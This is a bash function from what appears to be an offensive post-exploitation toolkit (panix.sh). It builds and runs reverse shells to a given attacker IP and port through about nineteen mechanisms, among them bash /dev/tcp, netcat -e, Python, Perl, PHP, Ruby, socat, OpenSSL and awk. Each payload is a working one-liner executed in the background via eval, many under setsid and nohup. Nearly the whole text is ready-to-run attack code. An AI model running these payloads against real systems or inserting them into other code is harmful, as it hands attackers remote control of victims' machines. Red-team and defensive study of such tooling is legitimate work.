setup_reverse_shell() {
    local ip=""
    local port=""
    local mechanism=""

    usage_reverse_shell() {
        echo "Usage: ./panix.sh --reverse-shell [OPTIONS]"
        echo "--ip <ip>                       Specify the attacker's IP address"
        echo "--port <port>                   Specify the port to connect to"
        echo "--mechanism <mechanism>         Specify the reverse shell mechanism"
        echo "--examples                      Display command examples"
        echo ""
        echo "Available mechanisms:"
        echo "awk, bash, busybox, gawk, ksh, lua, nawk, nc, node, openssl, perl, php, pip, python, python3, ruby, sh-udp, socat, telnet"
        echo ""
    }

    while [[ "$1" != "" ]]; do
        case $1 in
            --ip )
                shift
                ip=$1
                ;;
            --port )
                shift
                port=$1
                ;;
            --mechanism )
                shift
                mechanism=$1
                ;;
            --examples )
                echo "Examples:"
                echo "sudo ./panix.sh --reverse-shell --ip 10.10.10.10 --port 1337 --mechanism sh-udp"
                exit 0
                ;;
            --help|-h)
                usage_reverse_shell
                exit 0
                ;;
            * )
                echo "Invalid option for --reverse-shell: $1"
                echo "Try './panix.sh --reverse-shell --help' for more information."
                exit 1
        esac
        shift
    done

    # Validate arguments
    if [[ -z $ip || -z $port || -z $mechanism ]]; then
        echo "Error: --ip, --port, and --mechanism are required."
        echo "Try './panix.sh --reverse-shell --help' for more information."
        exit 1
    fi

    case $mechanism in
    awk )
        # Ref: https://gtfobins.github.io/gtfobins/awk/#non-interactive-reverse-shell
        echo "[!] Checking for Awk..."
        if command -v awk &>/dev/null; then
            echo "[+] Awk is available. Checking compatibility with |& operator..."
            # Test if `awk` supports the |& operator
            if awk 'BEGIN {exit !("|&" in _ENV)}' 2>/dev/null; then
                payload="awk -v RHOST=$ip -v RPORT=$port 'BEGIN {
                    s = \"/inet/tcp/0/\" RHOST \"/\" RPORT;
                    while (1) {
                        printf \"> \" |& s;
                        if ((s |& getline c) <= 0) break;
                        while (c && (c |& getline) > 0) print \$0 |& s;
                        close(c);
                    }
                }'"
                echo "[+] Awk is compatible. Executing reverse shell on $ip:$port..."
                eval "$payload &"
            else
                echo "[-] The installed Awk does not support the |& operator. Cannot use Awk for reverse shell."
            fi
        else
            echo "[-] Awk is not available on this system. Cannot use Awk for reverse shell."
        fi
        ;;
        bash )
            # Ref: https://gtfobins.github.io/gtfobins/bash/#reverse-shell
            echo "[!] Checking for Bash..."
            if command -v bash &>/dev/null; then
                payload="setsid nohup /bin/bash -i >& /dev/tcp/$ip/$port 0>&1"
                echo "[+] Bash is available. Executing reverse shell on $ip:$port..."
                eval "$payload &"
            else
                echo "[-] Bash is not available on this system. Cannot use Bash for reverse shell."
            fi
            ;;
        busybox )
            # Ref: https://gtfobins.github.io/gtfobins/busybox/#reverse-shell
            echo "[!] Checking for Busybox..."
            if command -v busybox &>/dev/null; then
                payload="busybox nc $ip $port -e /bin/sh"
                echo "[+] Busybox is available. Executing reverse shell on $ip:$port..."
                eval "$payload &"
            else
                echo "[-] Busybox is not available on this system. Cannot use Busybox for reverse shell."
            fi
            ;;
        gawk )
            # Ref: https://gtfobins.github.io/gtfobins/awk/#non-interactive-reverse-shell
            echo "[!] Checking for Gawk..."
            if command -v gawk &>/dev/null; then
                payload="gawk -v RHOST=$ip -v RPORT=$port 'BEGIN {
                    s = \"/inet/tcp/0/\" RHOST \"/\" RPORT;
                    while (1) {
                        printf \"> \" |& s;
                        if ((s |& getline c) <= 0) break;
                        while (c && (c |& getline) > 0) print \$0 |& s;
                        close(c);
                    }
                }'"
                echo "[+] Gawk is available. Executing reverse shell on $ip:$port..."
                eval "$payload &"
            else
                echo "[-] Gawk is not available on this system. Cannot use Gawk for reverse shell."
            fi
            ;;
        ksh )
            # Ref: https://gtfobins.github.io/gtfobins/ksh/#reverse-shell
            echo "[!] Checking for Ksh..."
            if command -v ksh &>/dev/null; then
                payload="ksh -c 'ksh -i > /dev/tcp/$ip/$port 2>&1 0>&1'"
                echo "[+] KornShell (KSH) is available. Executing reverse shell on $ip:$port..."
                eval "$payload &"
            else
                echo "[-] KornShell (KSH) is not available on this system. Cannot use KSH for reverse shell."
            fi
            ;;
        lua )
            # Ref: https://gtfobins.github.io/gtfobins/lua/#non-interactive-reverse-shell
            echo "[!] Checking for Lua..."
            if command -v lua &>/dev/null; then
                echo "[+] Lua is installed. Checking for LuaSocket..."
                
                if lua -e 'require("socket")' &>/dev/null; then
                    payload="export RHOST=$ip; export RPORT=$port; lua -e 'local s=require(\"socket\"); local t=assert(s.tcp()); t:connect(os.getenv(\"RHOST\"),os.getenv(\"RPORT\")); while true do local r,x=t:receive();local f=assert(io.popen(r,\"r\")); local b=assert(f:read(\"*a\"));t:send(b); end; f:close();t:close();'"
                    echo "[+] Lua & LuaSocket are available. Executing reverse shell on $ip:$port..."
                    eval "$payload &"
                else
                    echo "[-] LuaSocket module is not installed. Cannot use Lua for reverse shell."
                fi
            else
                echo "[-] Lua is not available on this system. Cannot use Lua for reverse shell."
            fi
            ;;
        nawk )
            # Ref: https://gtfobins.github.io/gtfobins/nawk/#non-interactive-reverse-shell
            echo "[!] Checking for Nawk..."
            if command -v nawk &>/dev/null; then
                payload="nawk -v RHOST=$ip -v RPORT=$port 'BEGIN {
                    s = \"/inet/tcp/0/\" RHOST \"/\" RPORT;
                    while (1) {
                        printf \"> \" |& s;
                        if ((s |& getline c) <= 0) break;
                        while (c && (c |& getline) > 0) print \$0 |& s;
                        close(c);
                    }
                }'"
                echo "[+] Nawk is available. Executing reverse shell on $ip:$port..."
                eval "$payload &"
            else
                echo "[-] nawk is not available on this system. Cannot use Nawk for reverse shell."
            fi
            ;;
        nc )
            # Ref: https://gtfobins.github.io/gtfobins/nc/#reverse-shell
            echo "[!] Checking for Netcat (nc.traditional)..."
            if command -v nc.traditional &>/dev/null; then
                payload="nc.traditional -e /bin/sh $ip $port"
                echo "[+] nc.traditional is available. Executing reverse shell on $ip:$port..."
                eval "$payload &"
            else
                echo "[-] nc.traditional is not available on this system. Cannot use nc.traditional for reverse shell."
            fi
            ;;
        node )
            # Ref: https://gtfobins.github.io/gtfobins/node/#reverse-shell
            echo "[!] Checking for Node.js..."
            if command -v node &>/dev/null; then
                echo "[+] Node.js is available. Executing reverse shell on $ip:$port..."
                payload="export RHOST=$ip; export RPORT=$port; node -e 'sh = require(\"child_process\").spawn(\"/bin/sh\"); require(\"net\").connect(process.env.RPORT, process.env.RHOST, function () { this.pipe(sh.stdin); sh.stdout.pipe(this); sh.stderr.pipe(this); })'"
                eval "$payload &"
            else
                echo "[-] Node.js is not available on this system. Cannot use Node.js for reverse shell."
            fi
            ;;
        openssl )
            # Ref: https://gtfobins.github.io/gtfobins/openssl/#reverse-shell
            echo "[!] Checking for OpenSSL..."
            if command -v openssl &>/dev/null; then
                echo "[+] OpenSSL is available. Executing reverse shell on $ip:$port..."

                echo ""
                echo "Make sure you have a correct listener up and running on the target host"
                echo "Use the following commands to set it up if you haven't already:"
                echo "openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes"
                echo "openssl s_server -quiet -key key.pem -cert cert.pem -port $port"
                echo ""

                payload="RHOST=$ip; RPORT=$port; mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect \$RHOST:\$RPORT > /tmp/s; rm /tmp/s"
                eval "$payload &"
            else
                echo "[-] OpenSSL is not available on this system. Cannot use OpenSSL for reverse shell."
            fi
            ;;
        perl )
            # Ref: https://gtfobins.github.io/gtfobins/perl/#reverse-shell
            echo "[!] Checking for Perl..."
            if command -v perl &>/dev/null; then
                echo "[+] Perl is available. Executing reverse shell on $ip:$port..."
                payload="export RHOST=$ip; export RPORT=$port; setsid nohup perl -e 'use Socket;\$i=\"\$ENV{RHOST}\";\$p=\$ENV{RPORT};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'"
                eval "$payload &"
            else
                echo "[-] Perl is not available on this system. Cannot use Perl for reverse shell."
            fi
            ;;
        php )
            # Ref: https://gtfobins.github.io/gtfobins/php/#reverse-shell
            echo "[!] Checking for PHP..."
            if command -v php &>/dev/null; then
                echo "[+] PHP is available. Executing reverse shell on $ip:$port..."
                payload="export RHOST=$ip; export RPORT=$port; setsid nohup php -r '\$sock=fsockopen(getenv(\"RHOST\"),getenv(\"RPORT\"));exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
                eval "$payload &"
            else
                echo "[-] PHP is not available on this system. Cannot use PHP for reverse shell."
                payload=""
            fi
            ;;
        python )
            # Ref: https://gtfobins.github.io/gtfobins/python/#reverse-shell
            echo "[!] Checking for Python..."
            if command -v python &>/dev/null; then
                echo "[+] Python is available. Executing reverse shell on $ip:$port..."
                payload="nohup setsid python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$ip\",$port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"
                eval "$payload &"
            else
                echo "[-] Python is not available on this system. Cannot use Python for reverse shell."
            fi
            ;;
        python3 )
            # Ref: https://gtfobins.github.io/gtfobins/python/#reverse-shell
            echo "[!] Checking for Python3..."
            if command -v python3 &>/dev/null; then
                echo "[+] Python3 is available. Executing reverse shell on $ip:$port..."
                payload="nohup setsid python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$ip\",$port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"
                eval "$payload &"
            else
                echo "[-] Python3 is not available on this system. Cannot use Python3 for reverse shell."
            fi
            ;;
        ruby )
            # Ref: https://gtfobins.github.io/gtfobins/ruby/#reverse-shell
            echo "[!] Checking for Ruby..."
            if command -v ruby &>/dev/null; then
                echo "[+] Ruby is available. Executing reverse shell on $ip:$port..."
                payload="export RHOST=$ip; export RPORT=$port; nohup setsid ruby -rsocket -e 'exit if fork;c=TCPSocket.new(ENV[\"RHOST\"],ENV[\"RPORT\"]);while(cmd=c.gets);IO.popen(cmd,\"r\"){|io|c.print io.read}end'"
                eval "$payload &"
            else
                echo "[-] Ruby is not available on this system. Cannot use Ruby for reverse shell."
            fi
            ;;
        sh-udp )
            # Ref: https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/#tools
            echo "[!] Checking for Sh..."
            if command -v sh &>/dev/null; then
                echo "[+] Sh found. Executing reverse shell on $ip:$port..."
                payload="setsid nohup sh -i >& /dev/udp/$ip/$port 0>&1"
                eval "$payload &"
            else
                echo "[-] Sh is not available on this system. Cannot use Sh for reverse shell."
            fi
            ;;
        socat )
            # Ref: https://gtfobins.github.io/gtfobins/socat/#reverse-shell
            echo "[!] Checking for Socat..."
            if command -v socat &>/dev/null; then
                echo "[+] Socat is available. Executing reverse shell to $ip:$port..."

                echo ""
                echo "Make sure you have a correct listener up and running on the target host"
                echo "Use the following commands to set it up if you haven't already:"
                echo "socat FILE:`tty`,raw,echo=0 TCP:$ip:$port"
                echo ""

                payload="RHOST=$ip; RPORT=$port; socat tcp-connect:\$RHOST:\$RPORT exec:/bin/sh,pty,stderr,setsid,sigint,sane"
                eval "$payload &"
            else
                echo "[-] Socat is not available on this system. Cannot use Socat for reverse shell."
            fi
            ;;
        telnet )
            # Ref: https://gtfobins.github.io/gtfobins/telnet/#reverse-shell
            echo "[!] Checking for Telnet..."
            if command -v telnet &>/dev/null; then
                echo "[+] Telnet is available. Executing reverse shell to $ip:$port..."
                payload="RHOST=$ip; RPORT=$port; TF=\$(mktemp -u); mkfifo \$TF && telnet \$RHOST \$RPORT 0<\$TF | /bin/sh 1>\$TF"
                eval "$payload &"
            else
                echo "[-] Telnet is not available on this system. Cannot use Telnet for reverse shell."
            fi
            ;;
        *)
            echo "Error: Unsupported mechanism: $mechanism"
            echo "Try './panix.sh --reverse-shell --help' for more information."
            exit 1
            ;;
    esac
}
